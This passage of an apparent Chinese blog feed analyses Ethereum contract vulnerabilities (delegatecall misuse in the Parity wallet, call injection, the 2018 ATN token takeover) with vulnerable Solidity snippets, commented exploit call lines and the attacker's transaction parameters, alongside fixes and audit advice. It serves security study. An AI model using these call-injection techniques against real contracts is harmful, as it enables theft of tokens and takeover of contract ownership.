href="https://github.com/paritytech/parity/blob/4d08e7b0aec46443bf26547b17d10cb302672835/js/src/contracts/snippets/enhanced-wallet.sol">Github/parity:</a> </p><p>a. delegatecall 调用代码：<br>(<code>contract Wallet is WalletEvents</code>)</p><pre><code>//在没有其他函数匹配时调用  function() payable {    // just being sent some cash?    if (msg.value &gt; 0)      Deposit(msg.sender, msg.value);    else if (msg.data.length &gt; 0)      _walletLibrary.delegatecall(msg.data);  }</code></pre><p>b. initWallet() 与 initMultiowned() 代码片段：<br>(<code>contract WalletLibrary is WalletEvents</code>)</p><pre><code>function initWallet(address[] _owners, uint _required, uint _daylimit) {    initDaylimit(_daylimit);    initMultiowned(_owners, _required);}...function initMultiowned(address[] _owners, uint _required) {    m_numOwners = _owners.length + 1;    m_owners[1] = uint(msg.sender);    m_ownerIndex[uint(msg.sender)] = 1;    for (uint i = 0; i &lt; _owners.length; ++i) {      m_owners[2 + i] = uint(_owners[i]);      m_ownerIndex[uint(_owners[i])] = 2 + i;    }    m_required = _required;}</code></pre><p>其中钱包初始化函数 <code>initMultiowned()</code> 未做校验，可以被多次调用，存在安全隐患，但由于其位于 <code>WalletLibrary</code> 合约下，是不能直接调用的。黑客利用 <code>Wallet</code> 合约中的 <code>delegatecall</code> 调用 <code>WalletLibrary</code> 合约的 <code>initWallet()</code> 函数，初始化整个钱包，将合约拥有者修改为仅黑客一人，随后进行转账操作。</p><p>黑客攻击链：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803205321834.png"></p><p>除了上述 <code>delegatecall</code> 滥用的案例，在分析研究的过程中，发现有部分蜜罐合约利用 <code>delegatecall</code> 的特性(拷贝目标到自己的运行空间中执行)，在代码中暗藏后门，暗中修改转账地址，导致用户丢失货币。有关 <code>delegatecall</code> 蜜罐的详情请参考<a href="https://paper.seebug.org/631/">「以太坊蜜罐智能合约分析」</a>，其中的 「4.2 偷梁换柱的地址(访问控制)：firstTest」小节。</p><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>可以通过不将构造函数逻辑完全提取到库合约中来阻止攻击，或者通过<em>不用<code>delegatecall</code>作全能转发机制来</em>更好地阻止攻击<em>。</em>推荐的模式是明确定义哪些库函数可以在钱包合约上从外部调用。</p><p>需要注意的是，将逻辑抽象到共享库中的技术可能非常有用。它有助于提高代码的可重用性并降低 gas 部署成本。然而，这次攻击清楚地表明<strong>，以太坊生态系统需要一套最佳实践和标准，以确保这些编码模式得到有效和安全的实施</strong>。否则，看起来最无辜的错误可能会带来灾难性的后果。</p><h3 id="call-安全问题"><a href="#call-安全问题" class="headerlink" title="call 安全问题"></a><strong>call 安全问题</strong></h3><blockquote><p>call: 最常用的调用方式，调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，执行环境为<strong>被调用者</strong>的运行环境。</p></blockquote><p><code>call</code> 注入是一种新的攻击场景，由「隐形人真忙」在先知大会上演讲<a href="https://xzfile.aliyuncs.com/upload/zcon/2018/9_%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B6%88%E6%81%AF%E8%B0%83%E7%94%A8%E6%94%BB%E9%98%B2_%E9%9A%90%E5%BD%A2%E4%BA%BA%E5%BE%88%E5%BF%99.pdf">「智能合约消息调用攻防」</a>议题上提出，原因是对 <code>call</code> 调用处理不当，配合一定的应用场景的一种攻击手段。</p><h4 id="call-注入原理"><a href="#call-注入原理" class="headerlink" title="call 注入原理"></a>call 注入原理</h4><p><strong>call 调用修改 msg.sender 值</strong><br>通常情况下合约通过 <code>call</code> 来执行来相互调用执行，由于 <code>call</code> 在相互调用过程中内置变量 <code>msg</code> 会随着调用方的改变而改变，这就成为了一个安全隐患，在特定的应用场景下将引发安全问题。</p><p>外部用户通过 call 函数再调用合约函数：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803211223597.png"></p><p><strong>高度自由的 call 调用</strong></p><p>在某些应用场景下，调用函数可以由用户指定；下面是 <code>call</code> 函数的调用方式：</p><pre><code>&lt;address&gt;.call(function_selector, arg1, arg2, ...)&lt;address&gt;.call(bytes)</code></pre><p>从上面可以看出，<code>call</code> 函数拥有极大的自由度：</p><ol><li>对于一个指定合约地址的 <code>call</code> 调用，可以调用该合约下的任意函数</li><li>如果 <code>call</code> 调用的合约地址由用户指定，那么可以调用任意合约的任意函数</li></ol><p>为了便于理解，可以将智能合约中的 <code>call</code> 函数类比为其他语言中的 <code>eval</code> 函数，<code>call</code> 函数相当于给用户提供了随意调用合约函数的入口，如果合约中有函数以 <code>msg.sender</code> 作为关键变量，那么就会引发安全问题。</p><p><strong>call 函数簇调用自动忽略多余参数</strong><br><code>call</code> 函数簇在调用函数的过程中，会自动忽略多余的参数，这又额外增加了 <code>call</code> 函数簇调用的自由度。下面的例子演示 <code>call</code> 自动忽略多余参数：</p><pre><code>pragma solidity ^0.4.0;contract A {    uint256 public aa = 0;    function test(uint256 a) public {        aa = a;    }    function callFunc() public {        this.call(bytes4(keccak256("test(uint256)")), 10, 11, 12);    }}</code></pre><p>例子中 <code>test()</code> 函数仅接收一个 <code>uint256</code> 的参数，但在 <code>callFunc()</code> 中传入了三个参数，由于 <code>call</code> 自动忽略多余参数，所以成功调用了 <code>test()</code> 函数。</p><h4 id="call-注入模型"><a href="#call-注入模型" class="headerlink" title="call 注入模型"></a>call 注入模型</h4><p><code>call</code> 注入引起的最根本的原因就是 <code>call</code> 在调用过程中，会将 <code>msg.sender</code> 的值转换为发起调用方的地址，下面的例子描述了 <code>call</code> 注入的攻击模型。</p><pre><code>contract B {    function info(bytes data){        this.call(data);        //this.call(bytes4(keccak256("secret()"))); //利用代码示意    }    function secret() public{        require(this == msg.sender);        // secret operations    }}</code></pre><p>在合约 B 中存在 <code>info()</code> 和 <code>secret()</code> 函数，其中 <code>secret()</code> 函数只能由合约自己调用，在 <code>info()</code> 中有用户可以控制的 <code>call</code> 调用，用户精心构造传入的数据(将注释转为字节序列)，即可绕过 <code>require()</code> 的限制，成功执行下面的代码。</p><p>对于 <code>call</code> 注入的问题，实际造成的漏洞影响取决于被调用的函数，那么可能的安全问题包括：</p><p><strong>1.权限绕过</strong><br>如同上面的例子，合约将合约本身的地址作为权限认证的条件之一，但由于 <code>call</code> 的调用会导致 <code>msg.sender</code> 变量值更新为调用方的值，所以就会引起权限绕过的问题。</p><pre><code>function callFunc(bytes data) public {    this.call(data);    //this.call(bytes4(keccak256("withdraw(address)")), target); //利用代码示意}function withdraw(address addr) public {    require(isAuth(msg.sender));    addr.transfer(this.balance);}function isAuth(address src) internal view returns (bool) {    if (src == address(this)) {        return true;    }    else if (src == owner) {        return true;    }    else {        return false;    }}</code></pre><p>上述例子表示了权限绕过导致的任意用户提取货币。withdraw()<code>函数设计的初衷为只能有合约拥有者和合约本身可以发起取款的操作；但由于</code>call<code>的问题，只要用户精心拼接字符序列调用</code>call<code>，从而调用 </code>withdraw()<code>函数，就可以绕过</code>isAuth()` 并取款。</p><p><strong>2.窃取代币</strong><br>在代币合约中，往往会加入一个 <code>call</code> 回调函数，用于通知接收方以完成后续的操作。但由于 <code>call</code> 调用的特性，用户可以向 <code>call</code> 传入 <code>transfer()</code> 函数调用，即可窃取合约地址下代币。下面的例子表示了用户传入 <code>transfer()</code> 函数导致窃取代币。</p><pre><code>function transfer(address _to, uint256 _value) public {    require(_value &lt;= balances[msg.sender]);    balances[msg.sender] -= _value;    balances[_to] += _value;}function callFunc(bytes data) public {    this.call(data);    //this.call(bytes4(keccak256("transfer(address,uint256)")), target, value); //利用代码示意}</code></pre><p>该例子是代币合约的代码片段，用户传入精心构造的字符序列以通过 <code>call</code> 来调用 <code>transfer()</code> 函数，并传入 <code>transfer()</code> 的参数 <code>_to</code> 为自己的地址；通过 <code>call</code> 调用后， <code>transfer()</code> 函数执行时的 <code>msg.sender</code> 的值已经是合约地址了，<code>_to</code> 地址是用户自己的地址，那么用户就成功窃取了合约地址下的代币。</p><h4 id="call-注入案例"><a href="#call-注入案例" class="headerlink" title="call 注入案例"></a>call 注入案例</h4><p><strong>1.ATN代币增发</strong></p><p>2018.5.11，ATN 技术人员收到异常监控报告，显示 <code>ATN Token</code> 供应量出现异常，通过分析发现 <code>Token</code> 合约由于存在漏洞受到攻击。该事件对应了上文中的第一种利用模型，由于 ATN 代币的合约中的疏漏，该事件中 <code>call</code> 注入不但绕过了权限认证，同时还可以更新合约拥有者。2018年5月11日中午，ATN技术人员收到异常监控报告，显示ATN Token供应量出现异常，迅速介入后发现Token合约由于存在漏洞受到攻击。本报告描述黑客的攻击操作、利用的合约漏洞以及ATN的应对追踪方法。</p><h4 id="攻击："><a href="#攻击：" class="headerlink" title="攻击："></a>攻击：</h4><ol><li>黑客利用ERC223方法漏洞，获得提权，将自己的地址设为owner<br><a href="https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b">https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b</a></li><li>黑客在获得owner权限后，发行1100w ATN到自己的攻击主地址<br><a href="https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910">https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910</a></li><li>黑客将owner设置恢复，企图隐藏踪迹<br><a href="https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a">https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a</a></li><li>黑客从主地址将偷来的黑币分散到14个地址中</li></ol><pre><code>0x54868268e975f3989d77e0a67c943a5e65ed4a73 3411558.2580x62892fd48fd4b2bbf86b75fc4def0a37b224fcc1 946828.30x57be7b4d3e1c6684dac6de664b7809185c8fc356 929,995.90x3b361e253c41897d78902ce5f7e1677fd01083da 838,9910x7279e64d3ae20745b150e330fc080050deebeb4d 784,409.410xb729eac33217c0b28251261194d79edd89d18292 762,518.60xe67dc4b47e0ac9b649e52cdb883370d348871d64 682,026.90x44660bae953555ccfdcc5a38c78a5a568b672daa 564,2880xf7e915e7ec24818f15c11ec74f7b8d4a604d7538 551,018.80xa4b45e8cca78e862d3729f10f4998da4200f10ef 438,277.60xc98e179f2909b1d0bce5b5d22c92bf803fc0d559 350,597.350xd5f898c7914e05ec7eaa3bf67aafd544a5bb5f24 325,291.10x3dd815af5d728903367a3036bc6dbe291de6f0ee 282,069.290x6d8750f28fffb8e9920490edb4ed1817a4736998 110,261.2948</code></pre><p>利用的合约漏洞：</p><p>ATN Token合约采用的是在传统ERC20Token合约基础上的扩展版本<a href="https://github.com/ethereum/EIPs/issues/223">ERC223</a>，并在其中使用了 <a href="https://github.com/dapphub/ds-auth">dapphub/ds-auth</a> 库。采用这样的设计是为了实现以下几个能力：</p><ol><li>天然支持Token互换协议，即ERC20Token与ERC20Token之间的直接互换。本质上是发送ATN时，通过回调函数执行额外指令，比如发回其他Token。</li><li>可扩展的、结构化的权限控制能力。</li><li>Token合约可升级，在出现意外状况时可进行治理。</li></ol><p>单独使用 ERC223 或者 ds-auth 库时，并没有什么问题，但是两者结合时，黑客利用了回调函数回调了setOwner方法，从而获得高级权限。</p><p><a href="https://github.com/ATNIO/atn-contracts/blob/7203781ad8d106ec6d1f9ca8305e76dd1274b181/src/ATN.sol#L100">ERC223转账</a>代码如下：</p><pre><code>function transferFrom(address _from, address _to, uint256 _amount,bytes _data, string _custom_fallback) public returns (bool success){...ERC223ReceivingContract receiver =ERC223ReceivingContract(_to);receiving.call.value(0)(byte4(keccak256(_custom_fallback)),_from, amout, data);...}</code></pre><p>当黑客<a href="https://etherscan.io/tx/0x3b7bd618c49e693c92b2d6bfb3a5adeae498d9d170c15fcc79dd374166d28b7b">转账</a>时在方法中输入以下参数：</p><pre><code>transferFrom( hacker_address, atn_contract_address, 0, 0,"setOwner(address)")_from: 0x2eca25e9e19b31633db106341a1ba78accba7d0f -- 黑客地址_to: 0x461733c17b0755ca5649b6db08b3e213fcf22546 -- ATN合约地址_amount: 0_data: 0x0_custom_fallback: setOwner(address)</code></pre><p>该交易执行的时候 receiver 会被 <code>_to(ATN合约地址)</code> 赋值， ATN 合约会调用 <code>_custom_fallback</code> 即 DSAuth 中的 setOwner(adddress) 方法，而此时的 msg.sender 变为 ATN 合约地址，<code>owner_</code>参数为<code>_from(黑客地址)</code></p><p>ds-auth库中setOwner <a href="https://github.com/dapphub/ds-auth/blob/c0050bbb6807027c623b1a1ee7afd86515cdb004/src/auth.sol#L36">代码</a>如下：</p><pre><code>functuin setOwner(address owner_) public auth{own = owner_;LogSetOwner(owner);}</code></pre><p>此时 setOwner 会先验证 auth 合法性的，而 msg.sender 就是ATN的合约地址。setOwner 的 modifier <a href="https://github.com/dapphub/ds-auth/blob/c0050bbb6807027c623b1a1ee7afd86515cdb004/src/auth.sol#L52">auth</a> 代码如下：</p><pre><code>modifier auth {require(isAuthorized(msg.sender, msg.sig));_;}function isAuthorized(address src, bytes4 sig) internal view returns(bool) {if (src == address(this)) { //此处的src与ATN合约地址一致返回truereturn true;} else { … }</code></pre><p>通过利用这个ERC223方法与DS-AUTH库的混合漏洞，黑客将 ATN Token合约的 owner 变更为自己控制的地址。获取 owner 权限后，黑客发起<a href="https://etherscan.io/tx/0x9b559ffae76d4b75d2f21bd643d44d1b96ee013c79918511e3127664f8f7a910">另外一笔交易</a>对 ATN 合约进行攻击，调用 mint 方法给另外一个地址发行 1100wATN。</p><p>最后，黑客调用 setOwner 方法将<a href="https://etherscan.io/tx/0xfd5c2180f002539cd636132f1baae0e318d8f1162fb62fb5e3493788a034545a">权限复原</a>。</p><p>在 ATN 项目中使用到了 <code>ERC223</code> 和 <code>ds-auth</code> 库，两个库在单独使用的情况下没有问题，同时使用时就会出现安全问题，以下是存在安全问题的代码片段： <a href="https://github.com/ATNIO/atn-contracts">Github/ATN</a>: </p><p>a. <code>ERC223</code> 标准中的自定义回调函数：<a href="https://github.com/Dexaran/ERC223-token-standard">Github/ERC223:</a> </p><pre><code>function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public returns (bool success) {    ...    if (isContract(_to)) {        ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);        receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);    }    ...}</code></pre><p>b. <code>ds-auth</code> 权限认证和更新合约拥有者函数：<a href="https://github.com/dapphub/ds-auth">Github/ds-auth:</a> </p><pre><code>...function setOwner(address owner_) public auth {    owner = owner_;    emit LogSetOwner(owner);}...modifier auth {    require(isAuthorized(msg.sender, msg.sig));    _;}function isAuthorized(address src, bytes4 sig) internal view returns (bool) {    if (src == address(this)) {        return true;    } else if (src == owner) {        return true;    } else if (authority == DSAuthority(0)) {        return false;    } else {        return authority.canCall(src, this, sig);    }}</code></pre><p>黑客通过调用 <code>transferFrom()</code> 函数，并传入黑客自己的地址作为 <code>_from</code> 参数， ATN 合约的地址作为 <code>_to</code> 参数，并传入 <code>setOwner()</code> 作为回调函数；在执行过程中，由于 <code>call</code> 调用自动忽略多余的参数，黑客的地址将作为 <code>setOwner()</code> 的参数成功执行到函数内部，与此同时，<code>call</code> 调用已经将 <code>msg.sender</code> 转换为了合约本身的地址，也就绕过了 <code>isAuthorized()</code> 的权限认证，黑客成功将合约的拥有者改为了自己；随后调用 <code>Mint()</code> 函数为自己发行代币，最后黑客再次调用 <code>setOwner()</code> 将权限还原，企图销毁作案现场。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803221127532.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803221157827.png"></p><h4 id="漏洞评估："><a href="#漏洞评估：" class="headerlink" title="漏洞评估："></a>漏洞评估：</h4><p>漏洞等级：严重</p><p>产品影响：atn-contracts</p><p>可能损失：导致Token总供应量发生变化</p><p>发现了基于ERC223标准与dapphub/ds-auth库相结合的合约漏洞，更准确的说是在ERC223回调函数发起时，调用本身合约时可能造成内部权限控制失效。</p><h4 id="应对措施："><a href="#应对措施：" class="headerlink" title="应对措施："></a>应对措施：</h4><p>经过上面的追踪，发现黑客将黑币分散在14个不同的新地址中，而这些地址中并没有ETH，暂时不存在立即的转账到交易所销赃的风险。我方有能力立即冻结黑客的黑币，恢复供应量的变化，所以，重点在如何追踪到黑客，应对思路如下：</p><ol><li>准备修复措施，增加Guard合约禁止回调函数向ATN合约本身回调；增加黑名单合约，随时冻结黑客地址</li><li>等待黑客向交易所发送充值交易，以便获得进一步证据</li><li>获得证据后，立即启动修复流程，将黑客相关地址加入黑名单，禁止其转移ATN Token</li><li>基金会销毁等量ATN Token以恢复供给总量，并在ATN主链上线时予以修正。</li></ol><p>产品修复：新增Guard合约，禁止对ATN合约发送转账交易，进而防止回调函数对ATN合约进行方法调用。</p><p>由于 ATN 合约的灵活性和治理扩展性，创建并添加了两个 Guard 合约。</p><ol><li>创建添加 <a href="https://etherscan.io/tx/0xb486decc811ef9744af223222004adbe3869706eb3f0f8e8736ae306a4ec7d88">FrozenGuard</a> 合约，禁止对 ATN 合约发送转账交易。</li><li>创建添加 <a href="https://etherscan.io/tx/0xf1cbbbd0ecd0098ce49b25644885870fe704465373ffb20f6a3117ad44531eae">StopTransferGuard</a> 合约，冻结黑客账户地址，禁止其 ATN进行转账。</li><li>基金会<a href="https://etherscan.io/tx/0xd8bfe8948259a0de2d28d14c6e45bda41ea09dc557ef38765964d6816c6bea8a">销毁</a> 1100w ATN，恢复 ATN 总量。</li></ol><p>ATN Gurad 会在发生转账交易时，对交易的合法性进行处理。</p><p>ATN 转账代码如下：</p><pre><code>function transferFrom(address _from, address _to, uint256 _amount,bytes _data, string _custom_fallback) public returns (bool success) {if (isContract(controller)) {if (!TokenController(controller).onTransfer(_from, _to,_amount))throw; } ...}</code></pre><p>ATN 的 TokenController 接管了 onTranser(_from, _to, amount) 处理方法，实现对交易的合法性验证。具体方法在 SwapController 中<a href="https://github.com/ATNIO/atn-contracts/blob/7203781ad8d106ec6d1f9ca8305e76dd1274b181/src/SwapController.sol#L29">实现</a>：</p><pre><code>function onTransfer(address _from,address _to, uint _amount) publicreturns (bool) {for (uint i =0; i&lt;guards.length; i++) { if (!gruards[i].onTokenTransfer(_from, _to, amount)) { return false; } }}</code></pre><p>SwapController 中维护了 TokenTransferGuard 的合约列表，可以添加多个 Guard 合约对交易的合法性进行验证。</p><p><a href="https://gist.github.com/HackFisher/ad2567bda8a082dd2e70ea86b427ee4d">FrozenGuard.sol</a> 代码如下：</p><pre><code>function onTokenTransfer(address _from, addres _to, uint _amount)public returns (bool) { if (_to == tokenAddress) { return false; } return true;}</code></pre><p>tokenAddress为 ATN 合约地址，禁止对 ATN 地址发送转账交易。</p><p>StopTransferGurad.sol 代码如下：</p><pre><code>function onTokenTransfer(address _from, addres _to, uint _amount)public returns (bool) { if (!stopped &amp;&amp; isBlack[_from]) { return false; } return true;}</code></pre><p>isBlack 存储所有黑客非法发行 ATN 的账户地址，支持动态更新。所有转账到这些的 ATN 也将无法转账。</p><p>stopped 该Guard的开关。</p><p>安全审计结果：</p><p>模拟冻结黑名单地址转账结果：<br><a href="https://kovan.etherscan.io/tx/0x68755305fee0d995f4ee79f6ab9d14e1aaf5d4b1c2d5838acbbaff464b6579d5">https://kovan.etherscan.io/tx/0x68755305fee0d995f4ee79f6ab9d14e1aaf5d4b1c2d5838acbbaff464b6579d5</a></p><p>模拟向ATN合约转账结果：<br><a href="https://kovan.etherscan.io/tx/0x78738ab30a507ac209fb4aaf80be7e92c558bff8767887d3e1f4e0a445f16444">https://kovan.etherscan.io/tx/0x78738ab30a507ac209fb4aaf80be7e92c558bff8767887d3e1f4e0a445f16444</a></p><p>模拟黑客攻击结果：<br><a href="https://kovan.etherscan.io/tx/0x7c72613fca4440b7775d08fde6beeba0e428a975cdf58a912ee76cb0e1ea87af">https://kovan.etherscan.io/tx/0x7c72613fca4440b7775d08fde6beeba0e428a975cdf58a912ee76cb0e1ea87af</a></p><p>转账都失败，判定漏洞已修复。</p><p>最终，黑客向交易所进行充值，获得证据</p><p><a href="https://etherscan.io/tx/0x18bd80b810f6a6b6d397901d677657d39f8471069bcb7cfbf490c1946dfd617d">https://etherscan.io/tx/0x18bd80b810f6a6b6d397901d677657d39f8471069bcb7cfbf490c1946dfd617d</a></p><p>Guard安全修复合约即刻部署，黑客相关地址予以禁止转账处理。</p><p>ATN将在交易所配合的情况下向黑客进行追踪，并保留向执法机构报案的权利。基金会<a href="https://etherscan.io/tx/0xd8bfe8948259a0de2d28d14c6e45bda41ea09dc557ef38765964d6816c6bea8a">销毁</a> 1100w ATN，恢复 ATN 总量，并将在主链上线时对黑客地址内的资产予以剔除。</p><p>由于 ATN 合约设计增加多项功能及治理机制，增加了审计的难度和复杂度，在发布到链上之前进行的几次内部和外部审计均未发现该漏洞。</p><p>攻击发生后，ATN技术团队及时察觉极速反应并部署了ATN Token合约的防御措施并迅速修复了此未知漏洞；在实时监测到黑客将资金转入交易所地址基本可断定为黑客攻击（而非白帽行为）后，跟相关交易所协商追踪黑客信息并保留追责权利。</p><p>合约的安全审计，仅依靠开发者的经验和能力总有隐患，过去业内的几次合约漏洞事件也说明了这个问题。将来我们需要有更多的类似形式化验证的工具来帮助开发者发现潜在问题，从而编写更加健壮的合约。</p><h4 id="对其他以太坊Token合约的预警"><a href="#对其他以太坊Token合约的预警" class="headerlink" title="对其他以太坊Token合约的预警:"></a>对其他以太坊Token合约的预警:</h4><p>所有同时用到类似ERC223推荐实现的custom_fallback和ds-auth的合约，或者说内置有其他权限控制得合约，很可能也存在这个漏洞，需要检查确认。</p><p>ERC223的这个custom_fallback 的call处理，可以让public获取Token合约的this作为msg.sender调用其他方法(虽然参数限定，但是也可以通过编码的方式hack)，另外ds-auth默认是this可以获得授权，这边有一些争议，是否ds-auth默认授权范围太大。</p><p><strong>2.大量代币使用不安全代码</strong></p><p>对于第二种利用模型，在目前公开的智能合约中，仍有不少合约使用这种不安全的代码，为了实现通知接收方以完成后续的操作，加入了一个高度自由的回调函数方法。以下是存在安全隐患的代码片段：</p><p>(etherscan: <a href="https://etherscan.io/address/0xbe803e33c0bbd4b672b97158ce21f80c0b6f3aa6#code">https://etherscan.io/address/0xbe803e33c0bbd4b672b97158ce21f80c0b6f3aa6#code</a>)</p><pre><code>...function transfer(address _to, uint256 _value) public returns (bool success) {    require(_to != address(0));    require(_value &lt;= balances[msg.sender]);    require(balances[_to] + _value &gt; balances[_to]);    balances[msg.sender] -= _value;    balances[_to] += _value;    Transfer(msg.sender, _to, _value);    return true;}...function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {    allowed[msg.sender][_spender] = _value;    Approval(msg.sender, _spender, _value);    if(!_spender.call(_extraData)) { revert(); }    return true;}...</code></pre><p>黑客通过调用 <code>approveAndCallcode()</code> 函数，将合约地址作为 <code>_spender</code> 参数，并将 <code>transfer()</code> 的调用转换为字节序列作为 <code>_extraData</code> 参数，最终调用 <code>transfer()</code> 函数。在 <code>transfer()</code> 函数中，<code>_to</code> 参数为黑客的地址，而此时 <code>msg.sender</code> 的值已经是合约本身的地址了，黑客通过这种方式，成功窃取了合约地址中的代币。</p><p>黑客攻击链：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803221925827.png"></p><p><strong>对于上述所描述的安全问题目前还不能造成直接的经济损失。在对这类智能合约的审计过程中，发现目前大量的代币合约不会使用到合约本身的地址作为存储单元，也就是说 合约地址所对应的代币量为 0 (<code>balances[address(this)] == 0</code>)。但这种不安全的代码很难猜测到在后续的发展中，会引起什么样的问题，应该保持关注并避免这种不安全的代码。</strong></p><h3 id="callcode-安全问题"><a href="#callcode-安全问题" class="headerlink" title="callcode 安全问题"></a>callcode 安全问题</h3><blockquote><p>callcode: 调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</p></blockquote><p>由于 <code>callcode</code> 同时包含了 <code>call</code> 和 <code>delegatecall</code> 的特性，通过上文对 <code>call</code> 和 <code>delegatecall</code> 的安全问题进行了分析和举例，可以得出的结论是 <code>call</code> 和 <code>delegatecall</code> 存在的安全问题将同时存在于 <code>callcode</code> 中，这里不再进行详细的分析。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>目前，区块链技术极高的热度促使该技术不断的投入到了生产环境中，但还没有完整的技术流水线，也没有统一的行业规范，同时 Solidity 语言现在版本为 <code>0.4.25</code>，还没有发布第一个正式版本，导致基于区块链技术的产品出现各种安全漏洞，部分漏洞可以直接造成经济损失。</p><p>针对文中所提到的安全隐患，这里给开发者几个建议：</p><ol><li><code>call</code>、<code>callcode</code>、<code>delegatecall</code>调用的自由度极大，并且 <code>call</code> 会发生 <code>msg</code> 值的改变，需要谨慎的使用这些底层的函数；同时在使用时，需要对调用的合约地址、可调用的函数做严格的限制。</li><li><code>call</code> 与 <code>callcode</code> 调用会改变 <code>msg</code> 的值，会修改 <code>msg.sender</code> 为调用者合约的地址，所以在合约中不能轻易将合约本身的地址作为可信地址。</li><li><code>delegatecall</code> 与 <code>callcode</code> 会拷贝目标代码到自己的环境中执行，所以调用的函数应该做严格的限制，避开调用任意函数的隐患。</li><li>智能合约在部署前必须通过严格的审计和测试。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 以太坊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨链与侧链</title>
      <link href="//%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/Ethernaut-%E6%B3%A2%E5%8D%A1%E5%92%8CCOMCOS/"/>
      <url>//%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/Ethernaut-%E6%B3%A2%E5%8D%A1%E5%92%8CCOMCOS/</url>
      
        <content type="html"><![CDATA[<h1 id="跨链与侧链"><a href="#跨链与侧链" class="headerlink" title="跨链与侧链"></a>跨链与侧链</h1><h2 id="跨链"><a href="#跨链" class="headerlink" title="跨链"></a>跨链</h2><p>简单的说跨链就是解决如何把一个条链上的Token转移到另外一条链上。本质上是一套链与链之间的清算机制，清算的本质就是精准记账。</p><p>为什么要跨链?</p><p>1、不同链上的资产交换</p><p>2、多个场景打通的token互兑</p><p>3、跨越多个区块链网络达成的智能合约</p><p>4、一条链上资产被抵押或者锁定，能否用于抵押另一条链上的商品与服务，这需要实现链之间的通信与确认</p><p>如何实现跨链</p><p>1、分布式私钥控制</p><p>2、用侧链&amp;中继链</p><p>3、公证人模式</p><p>4、哈希锁定模式</p>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闪电贷攻防和智能合约审计</title>
      <link href="//%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E9%98%B2%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
      <url>//%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E9%98%B2%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="闪电贷攻防和智能合约审计"><a href="#闪电贷攻防和智能合约审计" class="headerlink" title="闪电贷攻防和智能合约审计"></a>闪电贷攻防和智能合约审计</h1><h2 id="什么是闪电贷"><a href="#什么是闪电贷" class="headerlink" title="什么是闪电贷"></a>什么是闪电贷</h2><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723173933012.png"></p><p>本身是一个很好的金融创新，必须在智能合约中操作，原子性，最小单位执行，不成功就失败，要么成功要么失败</p><p>闪电贷和闪电兑</p><p>闪电贷AAVE项目</p><p>闪电兑函数UniswapV2项目</p><p>乐观转账</p><p>区别在于data参数有没有变化</p><h2 id="闪电贷攻击事件分析"><a href="#闪电贷攻击事件分析" class="headerlink" title="闪电贷攻击事件分析"></a>闪电贷攻击事件分析</h2><h2 id="闪电贷攻击防范建议"><a href="#闪电贷攻击防范建议" class="headerlink" title="闪电贷攻击防范建议"></a>闪电贷攻击防范建议</h2><h2 id="智能合约审计"><a href="#智能合约审计" class="headerlink" title="智能合约审计"></a>智能合约审计</h2>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello Ethernaut第0关练习</title>
      <link href="//Ethernaut/Ethernaut/0.Ethernaut-Hello%20Ethernaut/"/>
      <url>//Ethernaut/Ethernaut/0.Ethernaut-Hello%20Ethernaut/</url>
      
